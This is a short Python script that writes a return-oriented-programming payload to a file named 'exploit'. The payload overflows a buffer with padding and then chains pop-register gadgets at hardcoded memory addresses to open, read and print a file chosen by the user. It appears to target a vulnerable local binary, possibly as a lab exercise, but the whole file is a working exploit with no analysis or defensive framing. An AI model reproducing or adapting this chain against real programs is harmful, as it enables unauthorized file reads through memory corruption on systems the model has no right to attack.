import sys
import os

def pack64(n):
	s = ""
	while n:
		s += chr(n % 0x100)
		n = n / 0x100
	s = s.ljust(8, "\x00")
	return s

f = open("./exploit", "w")

# get filename from user
MAX_ROWS = 7
filename = sys.argv[1] + "\x00"
align_padding = (8-len(filename))%8
num_rows_occupied =(len(filename) + 7)//8 # ceiling division
filler_padding = MAX_ROWS - num_rows_occupied

payload = filename 			# filename to be opened
payload += "\x36"*align_padding		# align to the word size 
payload += pack64(0x37)*filler_padding 	# gives me a consistent buffer to write to
# open
payload += pack64(0x7ffff7a2e102)	# pop rdi gadget
payload += pack64(0x7fffffffe490)  	# (rdi) string address of filename
payload += pack64(0x7ffff7a2e100)	# pop rsi gadget
payload += pack64(0x0)			# (rsi) flags
payload += "\x00"*8			# (r15) dummy argument for r15
payload += pack64(0x7ffff7b04000)	# function call to open, returns fd 3
# read
payload += pack64(0x7ffff7a2e102)	# pop rdi gadget
payload += pack64(0x3)			# (rdi) fd = 3
payload += pack64(0x7ffff7a2e100)	# pop rsi gadget
payload += pack64(0x7fffffffe580)	# (rsi) buffer address to write to
payload += "\x00"*8			# (r15) dummy argument for r15
payload += pack64(0x7ffff7a0eb92)	# pop rdx gadget
payload += pack64(0x100)		# num bytes to be read
payload += pack64(0x7ffff7b04220)	# function call to read
# write
payload += pack64(0x7ffff7a2e102)	# pop rdi gadget
payload += pack64(0x1)			# (rdi) fd = 1 (stdout)
payload += pack64(0x7ffff7a2e100)	# pop rsi gadget
payload += pack64(0x7fffffffe580)	# (rsi) buffer address to write from
payload += "\x00"*8			# (r15) dummy argument for r15
payload += pack64(0x7ffff7a0eb92)	# pop rdx gadget
payload += pack64(0x100)		# num bytes to be read
payload += pack64(0x7ffff7b04280)	# function call to write 
# exit
payload += pack64(0x7ffff7a47030)

f.write(payload)
f.close()
